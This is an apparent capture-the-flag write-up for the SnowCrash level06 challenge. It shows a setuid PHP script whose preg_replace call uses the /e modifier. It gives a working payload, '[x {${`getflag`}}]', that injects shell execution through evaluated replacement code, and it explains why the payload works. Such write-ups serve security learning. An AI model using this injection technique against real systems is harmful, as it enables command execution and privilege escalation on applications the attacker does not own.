# LEVEL06

## Analysis

Let's see what we can find in our directory.
```bash
    level06@SnowCrash:~$ ls -la
    total 24
    dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
    d--x--x--x  1 root    users    340 Aug 30  2015 ..
    -r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
    -r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
    -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
    -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
    -r-x------  1 level06 level06  675 Apr  3  2012 .profile
    level06@SnowCrash:~$ cat level06.php
    #!/usr/bin/php
    <?php
    function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
    function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
    $r = x($argv[1], $argv[2]); print $r;
    ?>
```

We found a script level06.php.
```bash
    $ cat level06.php
    #!/usr/bin/php
    <?php
    function y($m)
    {
        $m = preg_replace("/\./", " x ", $m);
        $m = preg_replace("/@/", " y", $m);
        return $m;
    }
    function x($y, $z)
    {
        $a = file_get_contents($y);
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
        $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a);

        return $a;
    }
    $r = x($argv[1], $argv[2]);
    print $r;
    ?>
```

## Solution
So what we need to do is:
```bash
    level06@SnowCrash:~$ echo '[x {${`getflag`}}]' > /tmp/getflag
    level06@SnowCrash:~$ cat /tmp/getflag
    [x {${`getflag`}}]
    level06@SnowCrash:~$ ./level06 /tmp/getflag
    PHP Notice:  Undefined variable: Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXX
    in /home/user/level06/level06.php(4) : regexp code on line 1
```

## Explanation
/e makes the replacement evaluated as PHP code instead of being treated as a simple string. [x {${`getflag`}}] matches the pattern [x (.*)]
The group \\2 captures: {${`getflag`}}. The replacement becomes: y("{${`getflag`}}"). With the /e option, this code is EVALUATED:
- {${`getflag`}} is valid PHP syntax
- The backticks `getflag` execute the shell command getflag
- ${} forces the evaluation (executed as code) of the expression
- The curly braces {} encapsulate everything



